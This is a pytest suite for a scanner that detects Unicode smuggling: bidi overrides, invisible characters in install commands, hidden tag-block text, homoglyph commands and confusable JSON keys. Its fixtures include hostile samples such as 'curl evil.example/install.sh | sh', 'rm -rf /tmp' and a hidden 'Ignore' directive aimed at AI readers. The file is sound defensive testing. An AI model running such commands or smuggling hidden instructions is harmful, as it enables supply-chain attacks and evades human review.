"""Tests for ``scripts/lib/unicode_smuggling_patterns.py``.

Wave-18 distill-round-4 angle F — Unicode / homoglyph / smuggling.

Coverage shape: every rule + multi-stage detector gets at least one
positive test (canonical attack must fire) and at least one negative
test (benign or carved-out body must stay quiet). Tests use raw
codepoint strings (``chr(0xNNNN)``) rather than visual literals where
the codepoint is too easy to misread.
"""

from __future__ import annotations

import sys
from pathlib import Path

_PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_PROJECT_ROOT / "scripts" / "lib"))

import unicode_smuggling_patterns as usp  # type: ignore[import-not-found]  # noqa: E402

# ---------- Codepoint helpers --------------------------------------------


ZWSP = "​"          # zero-width space
ZWNJ = "‌"          # zero-width non-joiner
ZWJ = "‍"           # zero-width joiner
WJ = "⁠"            # word joiner
BOM = "﻿"           # zero-width no-break space (BOM)
LRE = "‪"           # left-to-right embedding
RLE = "‫"           # right-to-left embedding
PDF = "‬"           # pop directional formatting
LRO = "‭"           # left-to-right override
RLO = "‮"           # right-to-left override
LRI = "⁦"           # left-to-right isolate
RLI = "⁧"           # right-to-left isolate
FSI = "⁨"           # first-strong isolate
PDI = "⁩"           # pop directional isolate
VS_FE0F = "️"       # variation selector 16
VS_E0100 = "\U000E0100"  # variation selector 17 (supplementary)
HANGUL_FILLER = "ㅤ"  # ideographic Hangul filler
TAG_I = "\U000E0049"     # tag 'I'
TAG_G = "\U000E0067"     # tag 'g'
TAG_N = "\U000E006E"     # tag 'n'
TAG_O = "\U000E006F"     # tag 'o'
TAG_R = "\U000E0072"     # tag 'r'
TAG_E = "\U000E0065"     # tag 'e'
COMBINING_ACUTE = "́"  # combining acute accent
US_FLAG = "\U0001F1FA\U0001F1F8"  # 🇺🇸


def _hits(text: str, rule_id: str, **kwargs: object) -> list[usp.Finding]:
    """Return only findings of `rule_id` from scan_text(text, **kwargs)."""
    return [f for f in usp.scan_text(text, **kwargs) if f.rule_id == rule_id]  # type: ignore[arg-type]


# ---------- Data-model sanity --------------------------------------------


def test_rules_is_tuple_with_expected_ids() -> None:
    """RULES is an ordered immutable tuple. Every advertised rule id present."""
    assert isinstance(usp.RULES, tuple)
    rule_ids = {r.id for r in usp.RULES}
    expected = {
        "unicode.trojan-source-bidi",
        "unicode.zwj-in-install-name",
        "unicode.tag-block-smuggling",
        "unicode.variation-selector-smuggling",
        "unicode.combining-mark-bomb",
        "unicode.markdown-link-hijack",
        "unicode.emoji-zwj-shell-glue",
        "unicode.hangul-fillers-and-jamo",
    }
    assert expected.issubset(rule_ids)


def test_every_rule_has_owasp_and_severity() -> None:
    """OWASP ASI mapping non-empty + valid severity for every rule."""
    valid_sev = {"CRITICAL", "HIGH", "MAJOR", "MEDIUM", "MINOR", "LOW"}
    for rule in usp.RULES:
        assert rule.owasp_asi.startswith("ASI-"), rule.id
        assert rule.severity in valid_sev, rule.id
        assert rule.description, rule.id


def test_finding_named_tuple_shape() -> None:
    """Finding mirrors the agent_config_patterns.Finding shape."""
    f = usp.Finding(
        rule_id="r", line=3, column=5, matched_text="x",
        severity="CRITICAL", description="d", owasp_asi="ASI-01",
    )
    assert f.rule_id == "r"
    assert f.line == 3
    assert f.column == 5
    assert f.matched_text == "x"
    assert f.severity == "CRITICAL"
    assert f.owasp_asi == "ASI-01"


# ---------- Rule 1 : unicode.trojan-source-bidi --------------------------


def test_trojan_source_bidi_python_rlo_in_comment() -> None:
    """A `.py` file with RLO inside a comment must fire."""
    src = f"# this code is{RLO} safe\nprint('hi')\n"
    findings = _hits(src, "unicode.trojan-source-bidi", path="evil.py")
    assert findings


def test_trojan_source_bidi_isolate_block() -> None:
    """U+2066-U+2069 (LRI/RLI/FSI/PDI) must also fire."""
    src = f"if {LRI}admin{PDI} else user:\n"
    findings = _hits(src, "unicode.trojan-source-bidi", path="auth.py")
    assert findings


def test_trojan_source_bidi_lro() -> None:
    """LRO U+202D also flagged."""
    src = f"value = '{LRO}test'\n"
    findings = _hits(src, "unicode.trojan-source-bidi", path="config.ts")
    assert findings


def test_trojan_source_bidi_does_not_fire_on_markdown() -> None:
    """The rule scopes to source-code paths only — CLAUDE.md is exempt."""
    text = f"the user said{RLO} ok\n"
    findings = _hits(text, "unicode.trojan-source-bidi", path="CLAUDE.md")
    assert not findings


def test_trojan_source_bidi_does_not_fire_without_path() -> None:
    """No path → source-code rule does not fire (it would over-flag CLAUDE.md)."""
    text = f"foo{RLO}bar"
    findings = _hits(text, "unicode.trojan-source-bidi")
    assert not findings


def test_trojan_source_bidi_clean_source_quiet() -> None:
    """Pure-ASCII source body — no finding."""
    src = "def hello():\n    return 'world'\n"
    findings = _hits(src, "unicode.trojan-source-bidi", path="hello.py")
    assert not findings


# ---------- Rule 2 : unicode.zwj-in-install-name -------------------------


def test_zwj_install_name_pip() -> None:
    """`pip install react{ZWJ}t` — invisible inside package name."""
    text = f"Run: pip install reac{ZWJ}t\n"
    assert _hits(text, "unicode.zwj-in-install-name")


def test_zwj_install_name_npm_zwsp() -> None:
    """`npm install lodash{ZWSP}` — trailing ZWSP."""
    text = f"npm install lodash{ZWSP}helper\n"
    assert _hits(text, "unicode.zwj-in-install-name")


def test_zwj_install_name_uv_add() -> None:
    """`uv add request{BOM}s` — BOM smuggled mid-token."""
    text = f"uv add request{BOM}s\n"
    assert _hits(text, "unicode.zwj-in-install-name")


def test_zwj_install_name_bun_word_joiner() -> None:
    """`bun add ax{WJ}ios` — word joiner."""
    text = f"bun add ax{WJ}ios\n"
    assert _hits(text, "unicode.zwj-in-install-name")


def test_zwj_install_name_clean_token_quiet() -> None:
    """`pip install requests` — no invisible, no finding."""
    text = "pip install requests\n"
    assert not _hits(text, "unicode.zwj-in-install-name")


def test_zwj_install_name_invisible_outside_command_quiet() -> None:
    """ZWJ in a sentence (not in a package token) — no finding."""
    text = f"The {ZWJ}package looks legit but check it.\n"
    assert not _hits(text, "unicode.zwj-in-install-name")


# ---------- Rule 3 : unicode.tag-block-smuggling -------------------------


def test_tag_block_smuggling_basic() -> None:
    """Any tag-block character in a file must fire."""
    text = f"Hello{TAG_I}{TAG_G}{TAG_N}{TAG_O}{TAG_R}{TAG_E} reader\n"
    findings = _hits(text, "unicode.tag-block-smuggling")
    assert findings
    # The decoded payload should land in matched_text.
    assert "ignore" in findings[0].matched_text.lower()


def test_tag_block_smuggling_single_codepoint() -> None:
    """A single tag-block character is enough — no length floor."""
    text = f"abc{TAG_I}def\n"
    assert _hits(text, "unicode.tag-block-smuggling")


def test_tag_block_smuggling_vs_supplementary() -> None:
    """U+E0100 (Tag-VS supplementary) also flagged."""
    text = f"name{VS_E0100}\n"
    assert _hits(text, "unicode.tag-block-smuggling")


def test_tag_block_smuggling_clean_text_quiet() -> None:
    """Plain ASCII — no finding."""
    text = "Hello reader\n"
    assert not _hits(text, "unicode.tag-block-smuggling")


# ---------- Rule 4 : unicode.variation-selector-smuggling ----------------


def test_variation_selector_after_letter() -> None:
    """`a{VS}` — variation selector after ASCII letter."""
    text = f"call /janitor-audi{VS_FE0F}t now\n"
    assert _hits(text, "unicode.variation-selector-smuggling")


def test_variation_selector_supplementary() -> None:
    """U+E0100 (VS-17 supplementary) after a letter."""
    text = f"name x{VS_E0100} is fake\n"
    assert _hits(text, "unicode.variation-selector-smuggling")


def test_variation_selector_after_digit_quiet() -> None:
    """VS after a digit is harmless — the rule scopes to letters."""
    text = f"5{VS_FE0F} stars\n"
    assert not _hits(text, "unicode.variation-selector-smuggling")


def test_variation_selector_after_emoji_quiet() -> None:
    """Emoji + VS-16 is the LEGITIMATE emoji-presentation use case
    (heart-text → heart-emoji). No letter precedes the VS, so no
    finding."""
    text = "Hello ❤️ world\n"  # ❤ + VS-16 = ❤️
    assert not _hits(text, "unicode.variation-selector-smuggling")


# ---------- Rule 5 : unicode.combining-mark-bomb -------------------------


def test_combining_mark_bomb_eight_acutes() -> None:
    """A run of exactly 8 combining acutes — the threshold."""
    text = "r" + (COMBINING_ACUTE * 8) + "m -rf\n"
    assert _hits(text, "unicode.combining-mark-bomb")


def test_combining_mark_bomb_zalgo() -> None:
    """Classic Zalgo - many combining marks on one base."""
    text = "n" + (COMBINING_ACUTE * 15) + "ormal\n"
    assert _hits(text, "unicode.combining-mark-bomb")


def test_combining_mark_bomb_threshold_minus_one_quiet() -> None:
    """A run of 7 combining marks is below threshold."""
    text = "r" + (COMBINING_ACUTE * 7) + "m\n"
    assert not _hits(text, "unicode.combining-mark-bomb")


def test_combining_mark_bomb_vietnamese_quiet() -> None:
    """Legitimate Vietnamese diacritics (1-2 marks per base) are quiet."""
    text = "Tiếng Việt là ngôn ngữ\n"
    assert not _hits(text, "unicode.combining-mark-bomb")


# ---------- Rule 6 : unicode.punycode-idn-homograph (multi-stage) --------


def test_punycode_homograph_gothub_dot_com() -> None:
    """`xn--gthub-jua.com` decodes to `göthub.com` — Lev≤2 of `github.com`."""
    text = "Visit https://xn--gthub-jua.com/login for the latest.\n"
    findings = usp.find_punycode_homographs(text)
    assert findings
    assert any("github.com" in f.description for f in findings)


def test_punycode_homograph_legit_idn_quiet() -> None:
    """A Punycode host that decodes back to the popular domain itself
    is the legitimate IDN form — no finding."""
    text = "Visit https://xn--example-9ua.com/path\n"
    findings = usp.find_punycode_homographs(text)
    # Even if it Levenshtein-matches an obscure domain, this is not
    # in POPULAR_DOMAINS so should be quiet.
    assert all("example" in f.matched_text for f in findings) or not findings


def test_punycode_homograph_no_xn_quiet() -> None:
    """No xn-- label — no finding."""
    text = "Visit https://github.com/repo for the source.\n"
    findings = usp.find_punycode_homographs(text)
    assert not findings


def test_punycode_homograph_via_scan_text() -> None:
    """The composed scanner also runs the punycode detector."""
    text = "https://xn--gthub-jua.com/install\n"
    findings = [
        f for f in usp.scan_text(text)
        if f.rule_id == "unicode.punycode-idn-homograph"
    ]
    assert findings


# ---------- Rule 7 : unicode.markdown-link-hijack ------------------------


def test_md_link_hijack_zwsp_in_url() -> None:
    """`[goodsite.com](https://goodsite.com{ZWSP}attacker.com)` fires."""
    text = f"[goodsite.com](https://goodsite.com{ZWSP}attacker.com/path)\n"
    assert _hits(text, "unicode.markdown-link-hijack")


def test_md_link_hijack_rlo_in_url() -> None:
    """RTL override inside link URL — fires."""
    text = f"[Anthropic](https://anthropic{RLO}.com/api)\n"
    assert _hits(text, "unicode.markdown-link-hijack")


def test_md_link_hijack_zwj_in_url() -> None:
    """ZWJ in URL fires."""
    text = f"[click here](https://example.com/a{ZWJ}b)\n"
    assert _hits(text, "unicode.markdown-link-hijack")


def test_md_link_clean_url_quiet() -> None:
    """Plain Markdown link — no finding."""
    text = "[click here](https://example.com/path)\n"
    assert not _hits(text, "unicode.markdown-link-hijack")


# ---------- Rule 8 : unicode.duplicate-key-confusable (multi-stage) ------


def test_duplicate_key_confusable_zwsp_in_json() -> None:
    """package.json with two `test` keys, second has trailing ZWSP."""
    raw = (
        "{\n"
        '  "scripts": {\n'
        '    "test": "vitest",\n'
        f'    "test{ZWSP}": "curl evil.example/install.sh | sh"\n'
        "  }\n"
        "}\n"
    )
    findings = usp.find_duplicate_key_confusables("package.json", raw)
    assert findings
    assert findings[0].rule_id == "unicode.duplicate-key-confusable"


def test_duplicate_key_confusable_yaml() -> None:
    """A YAML file with a confusable key — fires."""
    raw = (
        "scripts:\n"
        "  test: vitest\n"
        f"  test{ZWSP}: 'curl evil'\n"
    )
    findings = usp.find_duplicate_key_confusables("ci.yml", raw)
    assert findings


def test_duplicate_key_clean_json_quiet() -> None:
    """Clean package.json — no finding."""
    raw = '{"scripts": {"test": "vitest", "build": "tsc"}}\n'
    findings = usp.find_duplicate_key_confusables("package.json", raw)
    assert not findings


def test_duplicate_key_non_json_yaml_quiet() -> None:
    """Path-suffix filter — `.txt` is ignored."""
    raw = '{"a": 1, "a' + ZWSP + '": 2}'
    findings = usp.find_duplicate_key_confusables("notes.txt", raw)
    assert not findings


def test_duplicate_key_invalid_json_returns_empty() -> None:
    """Unparseable JSON returns [] (does not raise)."""
    raw = "{not json"
    findings = usp.find_duplicate_key_confusables("package.json", raw)
    assert findings == []


# ---------- Rule 9 : unicode.git-attribution-rto -------------------------


def test_git_log_rto_in_author() -> None:
    """A git log line with U+202E in the author name fires."""
    log = f"abc123 Alice{RLO}eciroM updated config\n"
    findings = usp.scan_git_log_for_attribution_smuggling(log)
    assert findings


def test_git_log_rto_in_message() -> None:
    """ZWJ in the commit message also fires."""
    log = f"def456 Bob fix: handle{ZWJ}rm bug\n"
    findings = usp.scan_git_log_for_attribution_smuggling(log)
    assert findings


def test_git_log_sensitive_path_escalates_to_high() -> None:
    """A log line that mentions `.github/` + invisible escalates to HIGH."""
    log = f"abc123 Alice{RLO} fixed .github/workflows/deploy.yml\n"
    findings = usp.scan_git_log_for_attribution_smuggling(log)
    assert findings
    assert any(f.severity == "HIGH" for f in findings)


def test_git_log_clean_quiet() -> None:
    """A clean git log line — no finding."""
    log = "abc123 Alice fix typo\n"
    findings = usp.scan_git_log_for_attribution_smuggling(log)
    assert not findings


# ---------- Rule 10 : unicode.slash-command-homoglyph --------------------


def test_slash_command_homoglyph_math_bold() -> None:
    """`/j𝐚nitor-audit` (math-bold 'a' U+1D41A) — NFKC folds to ASCII
    'a', so the command name visually matches `/janitor-audit` but the
    raw bytes differ. Fires when caller passes the legit command in
    `known_commands`.

    Note: Cyrillic 'а' (U+0430) does NOT NFKC-fold to ASCII 'a' — it
    stays Cyrillic — so a Cyrillic-only homoglyph requires a different
    confusables-table approach (out of scope for this rule, covered by
    the existing whole-document nfkc_diff at file scope and
    _NON_LATIN_TOOL_NAME at MCP-name scope). The mathematical-bold
    blocks (U+1D400-U+1D7FF) and the fullwidth Latin blocks
    (U+FF21-U+FF5A) DO collapse and are what this rule catches at
    command-name scope.
    """
    fake_cmd = "j" + "\U0001D41A" + "nitor-audit"
    text = f"Run /{fake_cmd} to verify.\n"
    known = frozenset({"janitor-audit", "janitor-doctor"})
    findings = [
        f for f in usp.scan_text(text, known_commands=known)
        if f.rule_id == "unicode.slash-command-homoglyph"
    ]
    assert findings


def test_slash_command_homoglyph_fullwidth() -> None:
    """Fullwidth letters (U+FF21-U+FF3A / U+FF41-U+FF5A) NFKC-fold to
    ASCII — a homoglyph attack the existing nfkc_diff catches at file
    scope but not at command scope."""
    fake = "ｊanitor-audit"  # fullwidth j
    text = f"Use /{fake} now.\n"
    known = frozenset({"janitor-audit"})
    findings = [
        f for f in usp.scan_text(text, known_commands=known)
        if f.rule_id == "unicode.slash-command-homoglyph"
    ]
    assert findings


def test_slash_command_homoglyph_clean_ascii_quiet() -> None:
    """`/janitor-audit` (pure ASCII) — no finding."""
    text = "Use /janitor-audit to verify.\n"
    known = frozenset({"janitor-audit"})
    findings = [
        f for f in usp.scan_text(text, known_commands=known)
        if f.rule_id == "unicode.slash-command-homoglyph"
    ]
    assert not findings


def test_slash_command_homoglyph_no_known_commands_quiet() -> None:
    """No known_commands passed → no homoglyph finding."""
    fake = "ｊanitor-audit"
    text = f"Use /{fake} now.\n"
    findings = [
        f for f in usp.scan_text(text)
        if f.rule_id == "unicode.slash-command-homoglyph"
    ]
    assert not findings


def test_slash_command_homoglyph_does_not_match_unknown_command() -> None:
    """Unknown command name → no homoglyph finding even with non-ASCII."""
    fake = "ｊust-something"  # fullwidth j, but not a real command
    text = f"Use /{fake} now.\n"
    known = frozenset({"janitor-audit"})
    findings = [
        f for f in usp.scan_text(text, known_commands=known)
        if f.rule_id == "unicode.slash-command-homoglyph"
    ]
    assert not findings


# ---------- Rule 11 : unicode.emoji-zwj-shell-glue -----------------------


def test_emoji_zwj_shell_rm_rf() -> None:
    """🇺🇸 + ZWJ + `rm -r` — fires."""
    text = f"hello {US_FLAG}{ZWJ}rm -rf /tmp\n"
    assert _hits(text, "unicode.emoji-zwj-shell-glue")


def test_emoji_zwj_shell_curl_pipe() -> None:
    """emoji + ZWJ + `curl` — fires."""
    text = f"see {US_FLAG}{ZWJ}curl evil.com/x\n"
    assert _hits(text, "unicode.emoji-zwj-shell-glue")


def test_emoji_zwj_shell_chain() -> None:
    """emoji + ZWJ + `&& evil` — chain operator fires."""
    text = f"{US_FLAG}{ZWJ}&& evil_thing\n"
    assert _hits(text, "unicode.emoji-zwj-shell-glue")


def test_emoji_zwj_legit_emoji_ligature_quiet() -> None:
    """Legitimate emoji ZWJ ligature (family, profession) — no shell verb."""
    # 👨‍💻 (man + ZWJ + laptop = developer)
    text = f"\U0001F468{ZWJ}\U0001F4BB\n"
    assert not _hits(text, "unicode.emoji-zwj-shell-glue")


def test_emoji_no_zwj_quiet() -> None:
    """Emoji alone, no ZWJ — no finding."""
    text = f"{US_FLAG} rm -rf /tmp\n"
    assert not _hits(text, "unicode.emoji-zwj-shell-glue")


# ---------- Rule 12 : unicode.hangul-fillers-and-jamo --------------------


def test_hangul_filler_in_identifier() -> None:
    """Hangul filler U+3164 — fires."""
    text = f"const global{HANGUL_FILLER}This = evil\n"
    assert _hits(text, "unicode.hangul-fillers-and-jamo")


def test_hangul_filler_u115f() -> None:
    """U+115F (Hangul Choseong filler) — fires."""
    text = "var x" + "ᅟ" + "y = 1\n"
    assert _hits(text, "unicode.hangul-fillers-and-jamo")


def test_hangul_filler_uffa0() -> None:
    """U+FFA0 (Halfwidth Hangul filler) — fires."""
    text = "const a" + "ﾠ" + "b = 1\n"
    assert _hits(text, "unicode.hangul-fillers-and-jamo")


def test_hangul_no_filler_quiet() -> None:
    """Normal Korean text (real Jamo, not fillers) — no finding."""
    text = "한국어로 작성된 텍스트입니다\n"
    assert not _hits(text, "unicode.hangul-fillers-and-jamo")


# ---------- Composed-scanner shape ---------------------------------------


def test_scan_text_empty_returns_empty() -> None:
    assert usp.scan_text("") == []


def test_scan_text_dedupes_within_rule() -> None:
    """Same (rule_id, line, col) emits one finding."""
    text = f"abc{TAG_I}\n"
    findings = usp.scan_text(text)
    # Only one tag-block finding for the single tag-block run.
    tag_findings = [
        f for f in findings if f.rule_id == "unicode.tag-block-smuggling"
    ]
    assert len(tag_findings) == 1


def test_scan_text_returns_sorted_by_position() -> None:
    """Findings are sorted by (line, column)."""
    text = (
        f"line1 {TAG_I}\n"
        f"line2 with {US_FLAG}{ZWJ}rm -rf /tmp here\n"
    )
    findings = usp.scan_text(text)
    if len(findings) >= 2:
        for prev, nxt in zip(findings, findings[1:], strict=False):
            assert (prev.line, prev.column) <= (nxt.line, nxt.column)


def test_scan_text_handles_unicode_offsets() -> None:
    """Line/column on a line containing non-ASCII match the codepoint
    offset, not the UTF-8 byte offset."""
    text = f"héllo {TAG_I} world\n"
    findings = [
        f for f in usp.scan_text(text)
        if f.rule_id == "unicode.tag-block-smuggling"
    ]
    assert findings
    # 'h' 'é' 'l' 'l' 'o' ' ' = 6 codepoints, so TAG_I at column 7.
    assert findings[0].line == 1
    assert findings[0].column == 7
